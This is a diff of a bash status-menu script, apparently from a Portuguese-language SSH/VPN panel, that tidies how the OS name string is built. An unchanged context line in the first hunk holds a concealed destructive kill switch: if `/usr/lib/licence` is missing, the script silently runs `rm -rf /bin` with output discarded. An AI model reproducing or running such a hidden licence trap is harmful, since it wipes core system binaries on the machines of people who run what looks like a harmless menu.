@@ -6,11 +6,11 @@ autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m●" || echo 
 [[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
 if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
 system=$(cut -d' ' -f1 /etc/issue.net)
-system+=$(echo ' ')
+system+=' '
 system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
 elif [[ "$(grep -c "Debian" /etc/issue.net)" = "1" ]]; then
 system=$(cut -d' ' -f1 /etc/issue.net)
-system+=$(echo ' ')
+system+=' '
 system+=$(cut -d' ' -f3 /etc/issue.net)
 else
 system=$(cut -d' ' -f1 /etc/issue.net)
@@ -39,3 +39,4 @@ echo -e "\033[1;31mHora: \033[1;37m$_hora     \033[1;31mEm uso: \033[1;37m$_usor
 echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 echo -e "\033[1;32mOnlines:\033[1;37m $_onlin     \033[1;31mExpirados: \033[1;37m$_userexp \033[1;33mTotal: \033[1;37m$_tuser\033[0m"
 echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+}
